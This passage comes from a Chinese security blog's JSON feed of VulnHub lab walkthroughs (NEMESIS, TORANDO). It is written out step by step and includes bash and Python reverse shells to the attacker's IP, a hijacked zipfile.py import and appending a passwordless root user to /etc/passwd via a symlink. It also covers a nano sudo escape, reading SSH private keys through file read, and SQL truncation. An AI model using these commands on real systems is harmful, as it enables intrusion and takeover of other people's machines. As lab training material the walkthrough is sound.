data-src=\"/N1h1l157/VULNHUB/image-1335.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"ln-软连接\"><a class=\"markdownIt-Anchor\" href=\"#ln-软连接\">#</a> ln 软连接</h3>\n<p>上 pspy 监控看看，看到了一个脚本被定期执行</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1336.png\" width=\"590\" alt=\"Image\">\n<blockquote>\n<p>chown 是用来改变用户和用户组权限的，这个脚本可以更改位于用户 rocky 的主目录中的文件 public_html 内容的所有者，当前用户 apache 组，apache 用户可以访问目录中的文件</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1337.png\" width=\"400\" alt=\"Image\">\n<p>尝试直接修改 /etc/passwd 中的用户，生成一个无密码的是 root 权限的账户<br>\n <code>ln -s /etc/passwd /home/rocky/public_html/etcpasswd</code> <br>\n <code>ln -s</code>  后，对添加软连接的地方做出改变则原文件也发生了改变</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1338.png\" width=\"500\" alt=\"Image\">\n<p>等待定时任务被执行后，/etc/passwd 就会因为我们设置的软连接<br>\n /home/rocky/public_html/etcpasswd 的权限被修改为 rocky:apache，而<br>\n /etc/passwd 的权限也被改变为了 apache 可操作的文件</p>\n<h3 id=\"root密码置空\"><a class=\"markdownIt-Anchor\" href=\"#root密码置空\">#</a> root 密码置空</h3>\n<blockquote>\n<p><code>echo &quot;mhq::0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd</code> <br>\n 删除了 x，也就是删除 root 用户的密码身份验证<br>\n通过 su mhq 可以直接无密码升级到 root 权限</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1339.png\" width=\"550\" alt=\"Image\">\n<p>可以检验一下，现在我们 root 密码仍然未知，但是 mhq 的用户密码 x 不存在</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1340.png\" width=\"410\" alt=\"Image\">\n<p>-&gt; 可以直接通过一个普通用户提权到 root</p>\n",
            "tags": [
                "VULNHUB 41-50"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/146%20NEMESIS/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/146%20NEMESIS/",
            "title": "VULNHUB 46 NEMESIS",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaWEtbmVtZXNpcy0xMDEsNTgyLw==\">https://www.vulnhub.com/entry/ia-nemesis-101,582/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaW5mb3NlY2FydGljbGVzLmNvbS9uZW1lc2lzLXZ1bG5odWItd2Fsa3Rocm91Z2gv\">https://www.infosecarticles.com/nemesis-vulnhub-walkthrough/</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.0.135 (由于设置成了 DHCP、可能多变)<br>\n 靶机 NEMESIS：桥接于 192.168.0.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | uniq</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1399.png\" width=\"520\" alt=\"Image\">\n<p>2 ）粗略的识别一下该 ip 上开放了哪些端口<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | xargs sudo nmap -PA</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1400.png\" width=\"620\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.0.184 靶机开放端口 80</p>\n<p>3 ）对靶机开放的端口做更深一步的检索，检索各个服务上的详细信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1402.png\" width=\"440\" alt=\"Image\">\n<blockquote>\n<p>检索到的有效服务如下所示：<br>\n52846 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用<br>\n 80 52845 http：可对 web 进行渗透测试收集信息</p>\n</blockquote>\n<h3 id=\"目录扫描\"><a class=\"markdownIt-Anchor\" href=\"#目录扫描\">#</a> 目录扫描</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xODQv\">http://192.168.0.184/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1403.png\" width=\"620\" alt=\"Image\">\n<p>到处看了看，发现有一个用户名和密码</p>\n<p><code>Login Details =&gt; username : hacker_in_the_town password : thanos</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1404.png\" width=\"620\" alt=\"Image\">\n<p>找到登陆界面，用这个账户密码尝试登陆</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1405.png\" width=\"620\" alt=\"Image\">\n<p>登陆成功，但是进入到登陆后的界面，查询之后没有任何发现</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1406.png\" width=\"620\" alt=\"Image\">\n<p>用字典爆破目录，收集目录信息信息</p>\n<p><code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory- list-2.3-medium.txt -u http://192.168.0.184/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1407.png\" width=\"660\" alt=\"Image\">\n<p>依次访问几个目录发现没有比较明显的漏洞，换个字典，在爆破一波目录</p>\n<p><code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirb/common.txt -u http://192.168.0.184/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1408.png\" width=\"660\" alt=\"Image\">\n<p>爆出来的目录里边都没有什么发现，看一下下一个端口网站</p>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xODQ6NTI4NDUv\">http://192.168.0.184:52845/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1410.png\" width=\"620\" alt=\"Image\">\n<p><code>gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.0.184:52845</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1411.png\" width=\"660\" alt=\"Image\">\n<p><code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirb/common.txt -u http://192.168.0.184:52845/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1412.png\" width=\"700\" alt=\"Image\">\n<p>目录都没有什么问题，看来只能对页面的功能点尝试了</p>\n<h3 id=\"任意文件读取\"><a class=\"markdownIt-Anchor\" href=\"#任意文件读取\">#</a> 任意文件读取</h3>\n<p>在如下界面中，找到一个发送信息的功能，输入了如下信息之后发现有回显</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1414.png\" width=\"520\" alt=\"Image\">\n<p>点击发送消息后，读取到了 passwd 文件，审查源代码进行规范化，我们拿到了有 shell 的三个用户分别为 root，carlos，thanos</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1415.png\" width=\"580\" alt=\"Image\">\n<p>既然能读取文件，不妨测试一下是否能读到私钥文件，通过私钥文件登陆靶机</p>\n<p>依次读取这三个用户下的.ssh 文件夹下的 id_rsa 文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1416.png\" width=\"520\" alt=\"Image\">\n<p>root 下的没有读取到，可能是做了权限设置或者不存在私钥文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1417.png\" width=\"520\" alt=\"Image\">\n<p>thanos 下的读取到了，审查源代码处复制私钥到本地</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1418.png\" width=\"620\" alt=\"Image\">\n<p>最后把 carlos 下的私钥文件看看</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1419.png\" width=\"520\" alt=\"Image\">\n<p>这个用户下的私钥文件也没有读取到</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1420.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"特权用户计划任务\"><a class=\"markdownIt-Anchor\" href=\"#特权用户计划任务\">#</a> 特权用户计划任务</h3>\n<p>根据泄漏的私钥文件登陆到靶机中，注意修改私钥文件的权限<br>\n <code>chmod 600 thanos_id_rsa</code> <br>\n <code>ssh thanos@192.168.31.47 -p 52846 -i ~/Desktop/vulnhub/nemesis/thanos_id_rsa</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1421.png\" width=\"620\" alt=\"Image\">\n<p>在靶机上看到了一个备份文件内容如下</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1422.png\" width=\"470\" alt=\"Image\">\n<p>上传 pspy 监控，看这个备份脚本有没有定期被执行<br>\n <code>wget 192.168.0.168/pspy64s -q ;chmod +x pspy64s;./pspy64s</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1423.png\" width=\"520\" alt=\"Image\">\n<p>看到这个 UID=1000 的用户定期执行了 backup.py 这个脚本，而在前面收集到的 /etc/passwd 文件可知，UID=1000 的用户是 carlos</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1424.png\" width=\"620\" alt=\"Image\">\n<blockquote>\n<p>分析这个备份文件，可知它引入了 zipfile 这个包，而它会优先在同一目录下寻找 zipfile，当脚本将被执行时，它不会使用 zipfile 模块，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS16aXBmaWxlLTJkNWsyY3NyaDlzcXQ5YXpmbWg1YnI0Znp0dzZwOWR4MzlhdWQyZC5weQ==\">而是会导入我们的恶意软件 zipfile.py</span>，并且我们的反向 shell 也会被执行。</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">可在本地尝试此命令是否能反弹shell：</span></span><br><span class=\"line\">cat &gt; zipfile.py &lt;&lt; EOF</span><br><span class=\"line\">ZIP_DEFLATED = 0</span><br><span class=\"line\">class ZipFile:</span><br><span class=\"line\">\tdef close(*args):</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\tdef write(*args):</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\tdef __init__(self, *args):</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">__import__(&#x27;os&#x27;).system(&#x27;bash -c &quot;bash -i&gt;&amp; /dev/tcp/192.168.0.168/4444 0&gt;&amp;1&quot;&#x27;)</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1425.png\" width=\"580\" alt=\"Image\">\n<h3 id=\"py反弹shell优化\"><a class=\"markdownIt-Anchor\" href=\"#py反弹shell优化\">#</a> py 反弹 shell 优化</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">也可以不用借助bash直接用python来反弹shell，本地测试能否用在上靶机</span></span><br><span class=\"line\">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.168&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">上面的这个脚本不会反弹处标准shell，下面的这个会反弹处标准终端</span></span><br><span class=\"line\">python -c &#x27;import socket,pty,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.168&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(&quot;HISTFILE&quot;,&quot;/dev/null&quot;);pty.spawn(&quot;/bin/bash&quot;);s.close()&#x27;</span><br></pre></td></tr></table></figure>\n<h3 id=\"仿射加密法解密\"><a class=\"markdownIt-Anchor\" href=\"#仿射加密法解密\">#</a> 仿射加密法解密</h3>\n<blockquote>\n<p>现在成功拿到了 carlos 用户，即 UID= 1000 用户的终端，看到一个加密脚本仿射加密法与单码加密法没什么不同，因为明文的每个字母分别只映射到一个密文字母。仿射密码的加密算法就是一个线性变换，即对任意的明文字符 x，对应的密文字符为 y=e (x)=ax+b (mod26)，其中，a,b∈Z 26 ，且要求 gcd (a, 26 )= 1 , 函数 e (x) 称为仿射加密函数。</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1426.png\" width=\"480\" alt=\"Image\">\n<p>并且在此目录下找到了一个文件提示说密码为</p>\n<p>The password format is “****<strong><strong><strong><strong>FUN</strong></strong></strong></strong>”</p>\n<blockquote>\n<p>此脚本的作用就是将原密码加密后变成了 FAJSRWOXLAXDQZAWNDDVLSU 要两个 key 值，知道 FUN 经过加密后变成了 QZA，依此推断 key 的范围。关于更多放射密码可访问 https://en.wikipedia.org/wiki/Affine_cipher</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat &gt; 1.py &lt;&lt; EOF</span><br><span class=\"line\">import sys</span><br><span class=\"line\">\tdef affine_encrypt(text, key):</span><br><span class=\"line\">\treturn &#x27;&#x27;.join([ chr((( key[0]*(ord(t) - ord(&#x27;A&#x27;)) + key[1] ) % 26) + ord(&#x27;A&#x27;)) for t in text.upper().replace(&#x27; &#x27;, &#x27;&#x27;) ])</span><br><span class=\"line\">\t</span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">\taffine_text=&quot;FUN&quot;</span><br><span class=\"line\">\tfor key0 in range(65, 91):</span><br><span class=\"line\">\t\tfor key1 in range(65, 91):</span><br><span class=\"line\">\t\t\tencrypt_text = affine_encrypt(affine_text, [key0, key1])</span><br><span class=\"line\">\t\t\tif encrypt_text == &quot;QZA&quot;:</span><br><span class=\"line\">\t\t\t\tprint(key0,key1)</span><br><span class=\"line\">\t\t\t\tsys.exit(0)</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1427.png\" width=\"500\" alt=\"Image\">\n<p>得到 key 为（ 89 ， 65 ）之后，编写解密文件，进行解密密码</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat &gt; 2.py &lt;&lt; EOF</span><br><span class=\"line\">def affine_decrypt(cipher):</span><br><span class=\"line\">\ttext = []</span><br><span class=\"line\">\tfor t in cipher:</span><br><span class=\"line\">\t\tb = ord(t) - ord(&#x27;A&#x27;)</span><br><span class=\"line\">\t\tfor x in range(0, 26):</span><br><span class=\"line\">\t\t\tresult = (65 + x*89 - b) % 26</span><br><span class=\"line\">\t\t\tif result == 0:</span><br><span class=\"line\">\t\t\t\ttext.append(chr(x + ord(&#x27;A&#x27;)))</span><br><span class=\"line\">\t\t\t\tbreak</span><br><span class=\"line\">\tprint(&#x27;&#x27;.join(text))</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">\taffine_encrypted_text = &quot;FAJSRWOXLAXDQZAWNDDVLSU&quot;</span><br><span class=\"line\">\taffine_decrypt(affine_encrypted_text)</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1428.png\" width=\"390\" alt=\"Image\">\n<p>得到的密码测试之后是属于 carlos 用户的密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1429.png\" width=\"240\" alt=\"Image\">\n<h3 id=\"sudonano提权\"><a class=\"markdownIt-Anchor\" href=\"#sudonano提权\">#</a> sudo (nano) 提权</h3>\n<p>有了密码之后可以看到 carlos 用户权限设置</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1430.png\" width=\"580\" alt=\"Image\">\n<p>nano 的权限设置错误了</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看gtfobins找到了提权命令</span></span><br><span class=\"line\">sudo /bin/nano /opt/priv</span><br><span class=\"line\">Ctrl + R</span><br><span class=\"line\">Ctrl + X</span><br><span class=\"line\">reset; sh 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1431.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 成功拿到了 root 权限</p>\n",
            "tags": [
                "VULNHUB 41-50"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/145%20TORANDO/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/145%20TORANDO/",
            "title": "VULNHUB 45 TORANDO",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaWEtdG9ybmFkbyw2Mzkv\">https://www.vulnhub.com/entry/ia-tornado,639/</span><br>\n 教程链接地址 1: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hsanp6ai9hcnRpY2xlL2RldGFpbHMvMTIyOTUyNDI2\">https://blog.csdn.net/hljzzj/article/details/122952426</span><br>\n 教程链接地址 2: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaGlyYWswL2FydGljbGVzLzE2MjA3NTgwLmh0bWw=\">https://www.cnblogs.com/hirak0/articles/16207580.html</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135 (由于设置成了 DHCP、可能多变)<br>\n 靶机 TORANDO：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | uniq</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1341.png\" width=\"520\" alt=\"Image\">\n<p>2 ）粗略的识别一下该 ip 上开放了哪些端口<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | xargs sudo nmap -PA</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1342.png\" width=\"570\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.83 靶机开放端口 22,80</p>\n<p>3 ）对靶机开放的端口做更深一步的检索，检索各个服务上的详细信息</p>\n<p><code>sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.183 --min-rate=5000</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1344.png\" width=\"440\" alt=\"Image\">\n<blockquote>\n<p>检索到的有效服务如下所示：<br>\n22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用<br>\n 80 http：可对 web 进行渗透测试收集信息</p>\n</blockquote>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xODMv\">http://192.168.0.183/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1345.png\" width=\"590\" alt=\"Image\">\n<p>一个 apache 界面，看了一下框架，查看 robots 协议，.git 文件，审查源代码后均没有什么发现，开始扫描目录<br>\n <code>gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirb/common.txt --url http://192.168.0.183</code></p>\n<p>common.txt 字典稍微小一点，扫的速度比较快，是个不错的字典</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1346.png\" width=\"660\" alt=\"Image\">\n<p>没有扫描到有价值的信息，换个大字典在扫一下<br>\n <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.0.183/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1348.png\" width=\"660\" alt=\"Image\">\n<p>扫到一个目录 bluesky，访问 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xODMvYmx1ZXNreQ==\">http://192.168.0.183/bluesky</span> 发现了一个新的站点，是一个新的 web 界面，可对此进行扫描</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1350.png\" width=\"620\" alt=\"Image\">\n<p><code>gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirb/common.txt --url http://192.168.0.183/bluesky</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1352.png\" width=\"660\" alt=\"Image\">\n<h3 id=\"wfuzz-测试参数\"><a class=\"markdownIt-Anchor\" href=\"#wfuzz-测试参数\">#</a> wfuzz 测试参数</h3>\n<p>看到了注册登陆的功能，可以在 signup.php 下注册</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1354.png\" width=\"520\" alt=\"Image\">\n<p>然后在 login.php 下登陆</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1356.png\" width=\"520\" alt=\"Image\">\n<p>登陆成功之后，dashboard 页面显示出了当前的用户名</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1357.png\" width=\"620\" alt=\"Image\">\n<p>在 port 界面看到了有一个 LFI 漏洞的提示</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1358.png\" width=\"620\" alt=\"Image\">\n<p>用 wfuzz 测试一下是否有参数<br>\n <code>wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -c -u http://192.168.0.183/bluesky/port.php?FUZZ=xxx</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1359.png\" width=\"660\" alt=\"Image\">\n<p>发现回显全是 302 ，过滤之后在看看，判断是否有参数<br>\n <code>wfuzz -c -u http://192.168.31.53/bluesky/port.php?FUZZ=xxx) -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt | grep -v 302</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1360.png\" width=\"660\" alt=\"Image\">\n<p>审查源代码，看看有没有什么提示，发现了一个文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1361.png\" width=\"520\" alt=\"Image\">\n<p>但是访问不到这个文件，可能是做了一些变异</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1362.png\" width=\"380\" alt=\"Image\">\n<h3 id=\"脑力测试解谜\"><a class=\"markdownIt-Anchor\" href=\"#脑力测试解谜\">#</a> 脑力测试解谜</h3>\n<p>依次尝试怎么能访问到这个 imp.txt，最后在如下链接中找到了 imp.txt</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNjgvfnRvcmFuZG8vaW1wLnR4dA==\">http://192.168.0.168/~torando/imp.txt</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1363.png\" width=\"440\" alt=\"Image\">\n<p>最后还有一个 contact.php，点开看看说是一些功能出于安全因素已经修复</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1364.png\" width=\"620\" alt=\"Image\">\n<p>整理一下收集到的重要的信息，有一份 imp.txt 可能是一些邮箱地址，还有一个注册一个登陆的地方，需要通过这几个条件做突破</p>\n<p>将 imp.txt 下载到本地</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1365.png\" width=\"520\" alt=\"Image\">\n<p>依次用这几个用户尝试注册登陆，第一个用户是新用户，可进入其管理中心</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1366.png\" width=\"470\" alt=\"Image\">\n<p>第二个也是一个未注册的新用户</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1367.png\" width=\"470\" alt=\"Image\">\n<p>直到用第三个用户注册的时候，发现了输入的用户名的长度被限制了</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1368.png\" width=\"450\" alt=\"Image\">\n<p>修改源代码的长度限制，注册此用户</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1369.png\" width=\"450\" alt=\"Image\">\n<p>注册后发现也是一个新用户，可以进入其管理中心，想必这几个用户大部分都是未注册的用户，少部分是一些敏感用户，直接用 burp 批量注册发现有两个用户是注册过的一个是 admin@torando，一个是 jacob@torando</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1370.png\" width=\"450\" alt=\"Image\">\n<p>这两个用户是已经存在的用户，考虑爆破密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1371.png\" width=\"450\" alt=\"Image\">\n<h3 id=\"burp批量注册\"><a class=\"markdownIt-Anchor\" href=\"#burp批量注册\">#</a> burp 批量注册</h3>\n<p>数据拦截到 burp 中，选择 Cluster bomb 模式，对其进行爆破</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1372.png\" width=\"520\" alt=\"Image\">\n<p>uname 参数就设置为两个已经存在的用户</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1373.png\" width=\"420\" alt=\"Image\">\n<p>密码就选用常用来做 web 目录扫描的 directory-list-2.3-meduim.txt</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1374.png\" width=\"420\" alt=\"Image\">\n<p>爆破了一段时间之后，出现了结果，爆出来了 admin 用户的两个密码，是的两个密码，很奇怪，为什么会有两个密码？</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1375.png\" width=\"660\" alt=\"Image\">\n<p>选取一个密码进入 admin 的管理中心看看，没有什么发现</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1376.png\" width=\"520\" alt=\"Image\">\n<p>最后的线索指向了一个已经注册的用户 jacob@torando，还有在页面前端做了 13 的长度限制，以及 admin 用户有两个密码。</p>\n<h3 id=\"sql截断攻击\"><a class=\"markdownIt-Anchor\" href=\"#sql截断攻击\">#</a> sql 截断攻击</h3>\n<blockquote>\n<p>sql 截断攻击：<br>\n当数据库由于长度限制而截断用户输入时，就会发生 SQL 截断漏洞。攻击者可以收集关键字段 (例如用户名) 长度的信息，并利用这些信息获得未经授权的访问。<br>\n改变用户名的输入框的输入限制，并开始给 jacob@tornado 用户再次申请一个密码。</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1377.png\" width=\"400\" alt=\"Image\">\n<p>注册成功之后，用 jacob@tornado 登陆后发现是可以的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1378.png\" width=\"520\" alt=\"Image\">\n<p>在这个用户的 contact.php 界面找到了一个可以交互的界面</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1379.png\" width=\"520\" alt=\"Image\">\n<p>输入内容后，在页面中有回显，左下角显示出来了 id</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1380.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"无回显rce\"><a class=\"markdownIt-Anchor\" href=\"#无回显rce\">#</a> 无回显 RCE</h3>\n<p>既然有输入有回显，就很有可能是 RCE 漏洞，输入 id’;id, 但是回显依然是本身，可能不是单纯的 linux 的 echo‘id’命令</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1381.png\" width=\"520\" alt=\"Image\">\n<p>不知道命令是否执行了，用命令注入无回显的方法试试，先用 dnslog 测试</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1383.png\" width=\"520\" alt=\"Image\">\n<p>但是 dnslog 没有任何回显，可能命令执行了，但是服务器没有 curl 命令也会出现这样的情况，还可以用抓包的方式判断此命令是否执行。</p>\n<h3 id=\"tcpdump抓包\"><a class=\"markdownIt-Anchor\" href=\"#tcpdump抓包\">#</a> tcpdump 抓包</h3>\n<p>在 kali 上用 tcpdump 抓包，监听 eth0 网卡，以及靶机 ip<br>\n <code>sudo tcpdump -i eth0 host 192.168.0.183</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1384.png\" width=\"570\" alt=\"Image\">\n<p>此接口处用来 ping kali 机器，注意一定要搞成发送固定的数据包，不然 ping 